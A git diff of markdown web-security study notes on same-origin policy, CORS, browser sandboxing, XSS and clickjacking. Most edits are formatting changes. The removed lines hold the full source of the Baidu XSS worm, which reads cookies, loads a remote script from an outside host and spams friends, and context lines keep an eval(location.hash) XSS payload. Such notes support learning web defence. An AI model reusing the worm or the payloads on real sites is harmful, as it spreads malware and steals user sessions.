@@ -103,7 +103,6 @@ about:blank
 javascript:;
 ```
 [Test Experiment: InheritanceOfOrigin](https://github.com/dark-pool/Web-Security/tree/main/Test%20Experiment/InheritanceOfOrigin)  
-![Result](https://github.com/dark-pool/Web-Security/blob/main/Test%20Experiment/InheritanceOfOrigin/Output/67tool-2025-04-24%2022_21_33.png)  
 
 From the result, we know that these two methods both can create a blank document that inherits the origin of the parent page. But there are two things need to pay attention :  
 When using about:blank to open a blank page, new page' s origin is set as null, until load specific content in the new page. This is because the browser considers the new blank page as an opaque origin, and the behaviors may differ due to browser or version.  
@@ -126,61 +125,59 @@ Access-Control-Allow-Origin: null
 // Access-Control-Allow-Methods
 // Access-Control-Max-Age
 ```  
-For browser, when sending a cross-origin request, it would automatically add the origin header field to inform the server. Then the browser decides whether to allow cross-origin access based on CORS response header from server. (How it works? Simple Request & Complex Request)
-Implementing request headers for setting up CORS depends on the language and framework of the backend. For example, if using Express, so can use CORS middleware with all default configuration.
-Simple Request  
+For browser, when sending a cross-origin request, it would automatically add the origin header field to inform the server. Then the browser decides whether to allow cross-origin access based on CORS response header from server. (***How it works? Simple Request & Complex Request***)  
+Implementing request headers for setting up CORS depends on the language and framework of the backend. For example, if using Express, so can use CORS middleware with all default configuration.  
+> **Simple Request**[^4]  
 A request is classified as simple if it meets all the following criteria :
-HTTP Method: GET/POST/HEAD
-Headers: Contain only safe-listed headers, including : Accept, Accept-Language, Content-Language, Content-Type limited to:text/plain, multipart/form-data, application/x-www-form-urlencoded 
-No Event Listeners(e.g. UploadProgress to the request object)
-Browsers send requests directly and check the Access-Control-Allow-Origin response header, and do not require pre-inspection.
++ HTTP Method: GET/POST/HEAD  
++ Headers: Contain only safe-listed headers, including : Accept,Accept-Language, Content-Language, Content-Type limited to:text/plain, multipart/form-data, application/x-www-form-urlencoded  
++ No Event Listeners(e.g. UploadProgress to the request object)  
 
-添加图片注释，不超过 140 字（可选）
-Complex Request
-A request is classified as complex if it violates any of the simple request conditions.
-HTTP Method: PUT/DELETE/PATCH/CONNECT/OPTIONS/TRACE(non-simple methods )
-Headers: Include custom headers(e.g. Authorization,X-Custom-Header) or non-standard Content-Type(e.g. application/json)
-Other Features: Require credentials (e.g., withCredentials: true in JavaScript ), Uses advanced features like event listeners for request monitoring
-Preflight Request: When a complex request is detected, the browser will automatically sends an OPTIONS preflight request to validate server permissions before sending the actual request.
-In preflight request and responses headers, 
-Access-Control-Request-Method: Specifies the intended HTTP method (e.g., PUT).
-Access-Control-Request-Headers: Lists custom headers (e.g., Authorization).
+Browsers send requests directly and check the Access-Control-Allow-Origin response header, and do not require pre-inspection.   
 
-添加图片注释，不超过 140 字（可选）
+> **Complex Request**   
+A request is classified as complex if it violates any of the simple request conditions.   
++ HTTP Method: PUT/DELETE/PATCH/CONNECT/OPTIONS/TRACE(non-simple methods )
++ Headers: Include custom headers(e.g. Authorization,X-Custom-Header) or non-standard Content-Type(e.g. application/json)
++ Other Features: Require credentials (e.g., withCredentials: true in JavaScript ), Uses advanced features like event listeners for request monitoring
+  
+**Preflight Request**: When a complex request is detected, the browser will automatically sends an `OPTIONS` preflight request to validate server permissions before sending the actual request.  
+In preflight request and responses headers,   
+`Access-Control-Request-Method`: Specifies the intended HTTP method (e.g., `PUT`).
+`Access-Control-Request-Headers`: Lists custom headers (e.g., `Authorization`).   
+Allowing resource loading (e.g., images, CSS) by default but restricting active manipulation (e.g., modifying cross-origin iframes)   
 
-添加图片注释，不超过 140 字（可选）
+[Test Experiment: SimpleComplexRequest](https://github.com/dark-pool/Web-Security/tree/main/Test%20Experiment/SimpleComplexRequest)  
 
-Allowing resource loading (e.g., images, CSS) by default but restricting active manipulation (e.g., modifying cross-origin iframes)
-Cross-origin Embedding Resources 
+> ***Cross-origin Embedding Resources***  
+```
 <script src="">: load and execute JavaScript file 
 <link href="">: load CSS style sheet 
 <img>/<video>/<audio>: load images/videos/audios
 <object>/<embed>/<applet>: load Java Applets, Flash, PDF, etc. 
 <iframe>: load any resources, such as whole web page or application, but could set X-Frame-Options header to prohibit
 @font-size: load font
-Cross-origin Writes
-Form Submissins 
-Cross-origin Reads 
+```
 
-What are Third-Party Plugins Same Origin Policy?
-Flash
-crossdomain.xml 
+#### What are Third-Party Plugins Same Origin Policy?
+##### Flash
+crossdomain.xml[^5]  
 The following configuration allows onlytrusted-partner.comover HTTPS and permits theX-API-Keyheader:
+```
 <cross-domain-policy>  
   <site-control permitted-cross-domain-policies="by-content-only"/>  
   <allow-access-from domain="trusted-partner.com" secure="true"/>  
   <allow-http-request-headers-from domain="trusted-partner.com" headers="X-API-Key"/>  
 </cross-domain-policy>  
-
-https://www.qq.com/crossdomain.xml
-Browser Sandbox 
-It is a "virtual cage" that isolates web content(e.g., tabs, plugins, scripts) from operating system and hardware by restricting untrusted code from accessing sensitive resources.
-How it works?
-Isolation
+```   
+For example: https://www.qq.com/crossdomain.xml     
+### Browser Sandbox 
+It is a "virtual cage" that isolates web content(e.g., tabs, plugins, scripts) from operating system and hardware by restricting untrusted code from accessing sensitive resources.   
+#### How it works?
+**Isolation**   
 The browser runs web content in a restricted environment(sandbox environment) with limited permissions, even if malicious code runs, it can not escape the sandbox to modify files or install software, or spy on data.
 
-Process Separation
-
+**Process Separation**    
 Multi-threads Within each process
 Main thread
 Compositor thread
@@ -188,13 +185,13 @@ Raster thread
 I/O thread
 Web Workers
 Service Workers
-Example: Google Chrome 
+#### Example: Google Chrome 
 Per-Tab Sandbox : Multi-process Isolation : Each tab, extension, and plugin as a separate process with its own memory space and restricted OS access , so that prevents a single crashing tab from bringing down the entire browser.
 OS Integrity: On Windows, Chrome uses Job Objects and Win32k Lockdown to block system calls; On Linux/MacOS, it leverages namespaces and seccomp-bpf to limit resource access.
 Renderer Process Restrictions and GPU Sandbox: Blink Engine can not directly access the network or file system, or execute system commands or modify registry settings.
 
 添加图片注释，不超过 140 字（可选）
-Example: Internet Explorer(IE)
+#### Example: Internet Explorer(IE)
 IE sandbox approach is less robust compared to Chrome.
 Single-process model: Older IE versions(pre-IE9) run all tabs in one process.
 Protected Mode: In IE 7 and later version, protected mode runs browser in a low-privilege environment , and restricted from writing sensitive locations(e.g., user profile folders, Program Files)
@@ -353,7 +350,7 @@ Second Method: Hide and Load XSS Payload somewhere
 " onclick="eval(location.hash.substr(1))
 <input type="text" value="" onclick="eval(location.hash.substr(1)) " />
 
-What can XSS do?
+### What can XSS do?
 Identification of User Browser
 alert(navigator.userAgent)
 
@@ -502,162 +499,7 @@ Samy Worm
 It exploited an XSS flaw in MySpace in 2005, adding the text "Samy is my hero" to inflected profiles and automatically sending friend requests to Samy' s account, which spread to over 1 million users under 24 hours. 
 
 Baidu XSS Worm
-window.onerror = killErrors;
-execScript(unescape('Function%20URLEncoding%28vstrIn%29%0A%20%20%20%20strReturn%20%3D%20%22%22%0A%20%20%20%20For%20aaaa%20%3D%201%20To%20Len%28vstrIn%29%0A%20%20%20%20%20%20%20%20ThisChr%20%3D%20Mid%28vStrIn%2Caaaa%2C1%29%0A%20%20%20%20%20%20%20%20If%20Abs%28Asc%28ThisChr%29%29%20%3C%20%26HFF%20Then%0A%20%20%20%20%20%20%20%20%20%20%20%20strReturn%20%3D%20strReturn%20%26%20ThisChr%0A%20%20%20%20%20%20%20%20Else%0A%20%20%20%20%20%20%20%20%20%20%20%20innerCode%20%3D%20Asc%28ThisChr%29%0A%20%20%20%20%20%20%20%20%20%20%20%20If%20innerCode%20%3C%200%20Then%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20innerCode%20%3D%20innerCode%20+%20%26H10000%0A%20%20%20%20%20%20%20%20%20%20%20%20End%20If%0A%20%20%20%20%20%20%20%20%20%20%20%20Hight8%20%3D%20%28innerCode%20%20And%20%26HFF00%29%5C%20%26HFF%0A%20%20%20%20%20%20%20%20%20%20%20%20Low8%20%3D%20innerCode%20And%20%26HFF%0A%20%20%20%20%20%20%20%20%20%20%20%20strReturn%20%3D%20strReturn%20%26%20%22%25%22%20%26%20Hex%28Hight8%29%20%26%20%20%22%25%22%20%26%20Hex%28Low8%29%0A%20%20%20%20%20%20%20%20End%20If%0A%20%20%20%20Next%0A%20%20%20%20URLEncoding%20%3D%20strReturn%0AEnd%20Function'),'VBScript');
-cookie='';
-cookieval=document.cookie;
-spaceid=spaceurl;
-myhibaidu="http://hi.baidu.com"+spaceid;
-xmlhttp=poster();
-debug=0;
 
-online();
-
-if(spaceid!='/') {
-  if(debug==1) {
-    goteditcss();
-    document.cookie='xssshell/owned/you!';
-  }
-  if(cookieval.indexOf('xssshell')==-1) {
-    goteditcss();
-    document.cookie='xssshell/owned/you!';
-  }
-}
-
-function makeevilcss(spaceid,editurl,use){
-  playload="a{evilmask:ex/*exp/**/ression*/pression(execScript(unescape('d%253D%2522doc%2522%252B%2522ument%2522%253B%250D%250Ai%253D%2522function%2520load%2528%2529%257Bvar%2520x%253D%2522%252Bd%252B%2522.createElement%2528%2527SCRIPT%2527%2529%253Bx.src%253D%2527http%253A//www.18688.com/cache/1.js%2527%253Bx.defer%253Dtrue%253B%2522%252Bd%252B%2522.getElementsByTagName%2528%2527HEAD%2527%2529%255B0%255D.appendChild%2528x%2529%257D%253Bfunction%2520inject%2528%2529%257Bwindow.setTimeout%2528%2527load%2528%2529%2527%252C1000%2529%257D%253Bif%2528window.x%2521%253D1%2529%257Bwindow.x%253D1%253Binject%2528%2529%257D%253B%2522%250D%250AexecScript%2528i%2529')))}";
-  action=myhibaidu+"/commit";
-  spCssUse=use;
-  s=getmydata(editurl);
-
-  re = /\<input type=\"hidden\" id=\"ct\" name=\"ct\" value=\"(.*?)\"/i;
-  ct = s.match(re);
-  ct=(ct[1]);
-
-  re = /\<input type=\"hidden\" id=\"cm\" name=\"cm\" value=\"(.*?)\"/i;
-  cm = s.match(re);
-  cm=(cm[1])/1+1;
-
-  re = /\<input type=\"hidden\" id=\"spCssID\" name=\"spCssID\" value=\"(.*?)\"/i;
-  spCssID = s.match(re);
-  spCssID=(spCssID[1]);
-
-  spRefUrl=editurl;
-
-  re = /\<textarea(.*?)\>([^\x00]*?)\<\/textarea\>/i;
-  spCssText = s.match(re);
-  spCssText=spCssText[2];
-  spCssText=URLEncoding(spCssText);
-
-  if(spCssText.indexOf('evilmask')!==-1) {
-    return 1;
-  }
-  else spCssText=spCssText+"\r\n\r\n"+playload;
-
-  re = /\<input name=\"spCssName\"(.*?)value=\"(.*?)\">/i;
-  spCssName = s.match(re);
-  spCssName=spCssName[2];
-
-  re = /\<input name=\"spCssTag\"(.*?)value=\"(.*?)\">/i;
-  spCssTag = s.match(re);
-  spCssTag=spCssTag[2];
-
-  postdata="ct="+ct+"&spCssUse=1"+"&spCssColorID=1"+"&spCssLayoutID=-1"+"&spRefURL="+URLEncoding(spRefUrl)+"&spRefURL="+URLEncoding(spRefUrl)+"&cm="+cm+"&spCssID="+spCssID+"&spCssText="+spCssText+"&spCssName="+URLEncoding(spCssName)+"&spCssTag="+URLEncoding(spCssTag);
-  result=postmydata(action,postdata);
-  sendfriendmsg();
-  count();
-  hack();
-}
-
-function goteditcss() {
-  src="http://hi.baidu.com"+spaceid+"/modify/spcrtempl/0";
-  s=getmydata(src);
-  re = /\<link rel=\"stylesheet\" type=\"text\/css\" href=\"(.*?)\/css\/item\/(.*?)\.css\">/i;
-  r = s.match(re);
-  nowuse=r[2];
-  makeevilcss(spaceid,"http://hi.baidu.com"+spaceid+"/modify/spcss/"+nowuse+".css/edit",1);
-  return 0;
-}
-
-function poster(){
-  var request = false;
-  if(window.XMLHttpRequest) {
-    request = new XMLHttpRequest();
-    if(request.overrideMimeType) {
-      request.overrideMimeType('text/xml');
-    }
-  } else if(window.ActiveXObject) {
-    var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
-    for(var i=0; i<versions.length; i++) {
-      try {
-        request = new ActiveXObject(versions[i]);
-      } catch(e) {}
-    }
-  }
-  return request;
-}
-
-function postmydata(action,data){
-  xmlhttp.open("POST", action, false);
-  xmlhttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-  xmlhttp.send(data);
-  return xmlhttp.responseText;
-}
-
-function getmydata(action){
-  xmlhttp.open("GET", action, false);
-  xmlhttp.send();
-  return xmlhttp.responseText;
-}
-
-function killErrors() {
-  return true;
-}
-
-function count() {
-  a=new Image();
-  a.src='http://img.users.51.la/1563171.asp';
-  return 0;
-}
-
-function online() {
-  online=new Image();
-  online.src='http://img.users.51.la/1563833.asp ';
-  return 0;
-}
-
-function hack() {
-  return 0;
-}
-
-function sendfriendmsg(){
-  myfurl=myhibaidu+"/friends";
-  s=getmydata(myfurl);
-  evilmsg="哈，节日快乐呀!热烈庆祝2008，心情好好，记得要想我呀！\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n"+myhibaidu;
-
-  var D=function(A,B){A[A.length]=B;};
-  re = /(.+)D\(k\,\[([^\]]+?)\]\)(.*)/g;
-  friends = s.match(re);
-  eval(friends[0]);
-  for(i in k) {
-    eval('msgimg'+i+'=new Image();');
-    eval('msgimg'+i+'.src="http://msg.baidu.com/?ct=22&cm=MailSend&tn=bmSubmit&sn="+URLEncoding(k[i][2])+"&co="+URLEncoding(evilmsg)+"&vcodeinput=";');
-  }
-}
-function onlinemsg(){ 
-  doit=Math.floor(Math.random() * (600 + 1)); 
-  if(doit>500) { 
-    evilonlinemsg="哈哈,还记得我不,加个友情链接吧?\r\n\r\n\r\n我的地址是"+myhibaidu; 
-    xmlDoc=new ActiveXObject("Microsoft.XMLDOM"); 
-    xmlDoc.async=false; 
-    xmlDoc.load("http://hi.baidu.com/sys/file/moreonline.xml"); 
-    online=xmlDoc.documentElement; 
-    users=online.getElementsByTagName("id"); 
-    x=Math.floor(Math.random() * (200 + 1)); 
-    eval('msgimg'+x+'=new Image();'); 
-    eval('msgimg'+x+'.src="http://msg.baidu.com/?ct=22&cm=MailSend&tn=bmSubmit&sn= "+URLEncoding(users[x].text)+"&co="+URLEncoding(evilonlinemsg)+"&vcodeinput=";'); 
-  } 
-}
 Click Jacking/UI Redress Attack
 Deceives users into interacting with disguised interface elements(e.g., buttons, links ) by overlaying hidden or transparent layers on legitimate web pages, so that victim 's clicks are unknowingly redirected to perform unintended actions.
 Flash Click Jacking
@@ -772,6 +614,8 @@ Reference Books
 [^1]: https://blog.csdn.net/qq_74114417/article/details/144475186  
 [^2]: https://blog.csdn.net/weixin_26722031/article/details/108136630  
 [^3]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Access-Control-Allow-Origin  
+[^4]: https://juejin.cn/post/7404780384540098612  
+[^5]: https://www.cnblogs.com/daichangya/p/12959063.html    
 
   
 ## Recommended Tools
